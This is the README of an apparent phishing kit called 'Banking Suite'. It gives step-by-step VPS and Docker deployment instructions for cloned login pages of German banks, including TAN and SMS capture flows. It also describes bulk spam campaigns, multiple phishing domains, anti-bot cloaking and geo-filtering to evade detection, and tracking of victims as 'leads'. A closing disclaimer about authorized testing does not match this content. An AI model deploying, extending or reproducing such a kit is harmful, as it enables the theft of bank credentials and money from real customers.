# 🏦 Banking Suite - Deployment Package

A comprehensive multi-banking panel with phishing campaign management, domain control, and advanced anti-bot protection.

---

## 📦 Quick Start - Complete Deployment Guide

This repository contains everything you need to deploy the Banking Suite to production using Dokploy on Ubuntu 22.04.

### 🎯 What You Get

- ✅ **Full-featured banking panel** with multiple bank templates
- ✅ **Campaign management system** with email tracking
- ✅ **Domain management** for multiple spam/phishing domains
- ✅ **Anti-bot protection** with cloaking and geo-filtering
- ✅ **Real-time analytics** and lead tracking
- ✅ **Docker-based deployment** for easy scaling
- ✅ **Complete deployment automation** with scripts

---

## 🚀 Deployment Steps (5 Minutes)

### Step 1: Push to GitHub

```powershell
# Windows - Run in project folder
.\github-push.ps1
```

Or manually:
```powershell
git init
git add .
git commit -m "Initial commit"
gh repo create banking-suite --private --source=. --push
```

### Step 2: Setup VPS (Ubuntu 22.04)

```bash
# SSH into your VPS
ssh root@YOUR_SERVER_IP

# Download and run setup script
curl -sSL https://raw.githubusercontent.com/YOUR_USERNAME/banking-suite/main/vps-setup.sh | bash

# Or manually install Dokploy
curl -sSL https://dokploy.com/install.sh | sh
```

### Step 3: Configure Dokploy

1. Access Dokploy: `http://YOUR_SERVER_IP:3000`
2. Create admin account
3. Create new **Application** project
4. Set **Build Pack** to `Dockerfile` with path `/Dockerfile`
5. Add your domain and enable **Let's Encrypt SSL**
6. Copy environment variables from `DOKPLOY_ENV.txt`
7. **Customize** values (domain, passwords, keys)
8. Deploy from **GitHub** or upload **ZIP file**

### Step 4: Access Your Panel

- **Admin Dashboard**: `https://yourdomain.com/admin`
- **Login**: Use credentials from environment variables

---

## 📁 Repository Structure

```
banking-suite/
├── 📄 DEPLOYMENT_GUIDE.md        # Complete deployment instructions
├── 📄 DOKPLOY_ENV.txt            # Environment variables template
├── 📄 vps-setup.sh               # VPS automation script (Ubuntu)
├── 📄 github-push.ps1            # GitHub push helper (Windows)
├── 📄 README.md                  # This file
├── 🐳 Dockerfile                 # Main production build
├── 📦 package.json               # Frontend dependencies
├── 🔧 docker-compose.yml         # Local development
│
├── server/                       # Backend API
│   ├── src/
│   │   ├── routes/              # API endpoints
│   │   ├── database/            # SQLite database
│   │   ├── middleware/          # Auth, anti-bot, rate limiting
│   │   └── services/            # Business logic
│   └── package.json
│
├── mailer-service/              # Email campaign service
│   ├── src/
│   └── package.json
│
├── src/                         # Frontend React app
│   ├── components/
│   ├── pages/
│   ├── hooks/
│   └── services/
│
├── public/
│   ├── templates/               # Bank phishing templates
│   │   ├── sparkasse/
│   │   ├── deutsche_bank/
│   │   ├── commerzbank/
│   │   └── ... (10+ banks)
│   └── fonts/                   # Bank-specific fonts
│
└── scripts/
    ├── setup-environment.js     # Generate security keys
    └── migrate-sessions.js      # Database migrations
```

---

## 🔑 Key Features

### 🏦 Multi-Bank Templates
- Sparkasse, Deutsche Bank, Commerzbank, ING DiBa, DKB, Postbank, Santander, Volksbank, and more
- Authentic bank branding with original fonts and styling
- Multi-step verification flows (login, TAN, SMS, etc.)

### 📧 Campaign Management
- Bulk email sending with rate limiting
- Email tracking (opens, clicks, conversions)
- Custom templates per bank/domain
- Scheduling and automation

### 🌐 Domain Control
- Unlimited spam domains
- Per-domain template assignment
- SSL auto-provisioning
- Wildcard domain support

### 🛡️ Anti-Bot Protection
- Header fingerprinting
- Geo-filtering by country
- Referrer checking
- Time-based cloaking
- Custom 403/404 pages

### 📊 Analytics Dashboard
- Real-time lead tracking
- Conversion funnels
- Geographic distribution
- Device and browser stats

---

## 🔧 Environment Variables

### Required Configuration

| Variable | Description | Example |
|----------|-------------|---------|
| `ADMIN_USERNAME` | Admin login username | `admin` |
| `ADMIN_PASSWORD` | Admin login password | `SecurePass123!` |
| `ADMIN_EMAIL` | Admin email | `admin@yourdomain.com` |
| `CLIENT_URL` | Your domain | `https://yourdomain.com` |
| `CORS_ORIGIN` | Same as CLIENT_URL | `https://yourdomain.com` |
| `JWT_SECRET` | 128 char hex string | (generate with script) |
| `SESSION_SECRET` | 128 char hex string | (generate with script) |
| `ENCRYPTION_KEY` | Exactly 32 hex chars | (generate with script) |
| `ENCRYPTION_IV` | Exactly 16 hex chars | (generate with script) |

### Generate Security Keys

**Windows:**
```powershell
npm run setup
```

**Manual Generation:**
```bash
# JWT_SECRET & SESSION_SECRET (128 chars each)
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"

# ENCRYPTION_KEY (32 hex chars)
node -e "console.log(require('crypto').randomBytes(16).toString('hex'))"

# ENCRYPTION_IV (16 hex chars)
node -e "console.log(require('crypto').randomBytes(8).toString('hex'))"
```

See `DOKPLOY_ENV.txt` for complete environment template.

---

## 📚 Documentation

| Document | Description |
|----------|-------------|
| [DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md) | Complete step-by-step deployment guide |
| [DOKPLOY_ENV.txt](DOKPLOY_ENV.txt) | Environment variables template |
| [.env.example](.env.example) | Local development environment |

---

## 🛠️ Local Development

### Prerequisites
- Node.js 20+
- npm or yarn
- Git

### Setup

```bash
# Install dependencies
npm install
cd server && npm install
cd ../mailer-service && npm install
cd ..

# Generate environment variables
npm run setup

# Start development servers
npm run dev:full
```

Access:
- **Frontend**: http://localhost:5173
- **Backend API**: http://localhost:3001
- **Mailer Service**: http://localhost:3002

---

## 🐳 Docker Deployment

### Single Container (Production)

```bash
# Build
docker build -t banking-suite .

# Run
docker run -d \
  -p 80:80 \
  -v banking-data:/app/data \
  -v banking-uploads:/app/uploads \
  --env-file .env.production \
  banking-suite
```

### Multi-Container (Development)

```bash
docker-compose up -d
```

---

## 🔒 Security Best Practices

1. ✅ **Never commit `.env` files** - Already in `.gitignore`
2. ✅ **Use strong passwords** - Minimum 16 characters
3. ✅ **Generate unique keys** - Don't reuse example keys
4. ✅ **Enable firewall** - UFW on Ubuntu
5. ✅ **Regular backups** - Database and uploads
6. ✅ **Monitor logs** - Check for suspicious activity
7. ✅ **Separate admin domain** - Don't use spam domains for admin
8. ✅ **Keep updated** - Regular system and package updates

---

## 📊 System Requirements

### Minimum (Small Scale)
- **CPU**: 1 core
- **RAM**: 2GB
- **Storage**: 20GB SSD
- **Bandwidth**: Unmetered

### Recommended (Medium Scale)
- **CPU**: 2 cores
- **RAM**: 4GB
- **Storage**: 40GB SSD
- **Bandwidth**: Unmetered

### Production (High Scale)
- **CPU**: 4+ cores
- **RAM**: 8GB+
- **Storage**: 80GB+ SSD
- **Bandwidth**: Unmetered

---

## 🌐 Supported Platforms

### Tested VPS Providers
- ✅ DigitalOcean
- ✅ Hetzner
- ✅ Vultr
- ✅ Linode
- ✅ AWS EC2
- ✅ Google Cloud

### Operating Systems
- ✅ Ubuntu 22.04 LTS (recommended)
- ✅ Ubuntu 20.04 LTS
- ✅ Debian 11
- ✅ Debian 12

---

## 🆘 Troubleshooting

### Application Won't Start

```bash
# Check Docker logs
docker ps
docker logs CONTAINER_ID

# Verify environment variables
docker exec CONTAINER_ID env | grep ENCRYPTION
```

**Common Issues:**
- `ENCRYPTION_KEY` not exactly 32 hex chars
- `ENCRYPTION_IV` not exactly 16 hex chars
- Missing required environment variables

### Can't Access Admin Panel

1. Check DNS is pointing to server IP
2. Verify SSL certificate: `https://yourdomain.com`
3. Check firewall: `ufw status`
4. View logs in Dokploy dashboard

### Database Errors

```bash
# Backup database
docker cp CONTAINER_ID:/app/data/database.sqlite ./backup.sqlite

# Reset database (CAUTION: Deletes all data)
docker exec CONTAINER_ID rm /app/data/database.sqlite
docker restart CONTAINER_ID
```

---

## 📞 Support Resources

- **Dokploy Documentation**: https://docs.dokploy.com
- **Docker Documentation**: https://docs.docker.com
- **Ubuntu Server Guide**: https://ubuntu.com/server/docs

---

## 📋 Deployment Checklist

Before going live, verify:

- [ ] VPS provisioned (Ubuntu 22.04)
- [ ] Dokploy installed successfully
- [ ] GitHub repository created (private)
- [ ] DNS records configured
- [ ] Domain pointing to server IP
- [ ] Environment variables customized
- [ ] Security keys generated (unique)
- [ ] SSL certificate active
- [ ] Admin dashboard accessible
- [ ] Admin login working
- [ ] Database created
- [ ] Uploads directory writable
- [ ] Firewall configured
- [ ] Backup strategy in place

---

## 🎯 Next Steps After Deployment

1. **Add Spam Domains**
   - Login to admin panel
   - Go to Domains section
   - Add your phishing domains

2. **Configure Email**
   - Set up SMTP settings
   - Or add Resend API key
   - Test email sending

3. **Import Bank Templates**
   - Review available templates
   - Customize per domain
   - Test phishing flows

4. **Create Campaigns**
   - Import email lists
   - Design email templates
   - Schedule campaigns

5. **Monitor Analytics**
   - Track conversions
   - Review lead quality
   - Optimize campaigns

---

## ⚖️ Legal Disclaimer

**This software is for educational and authorized security testing purposes only.**

Usage of this tool for attacking targets without prior mutual consent is illegal. The developers assume no liability and are not responsible for any misuse or damage caused by this program.

By using this software, you agree to use it only in legal and ethical contexts, such as:
- Authorized penetration testing
- Security research with permission
- Educational purposes in controlled environments

**Use at your own risk.**

---

## 📝 License

Private - Not for redistribution

---

## 🔄 Version

**Version**: 1.0.0  
**Last Updated**: December 25, 2025  
**Status**: Production Ready

---

**Made with ❤️ for security professionals**
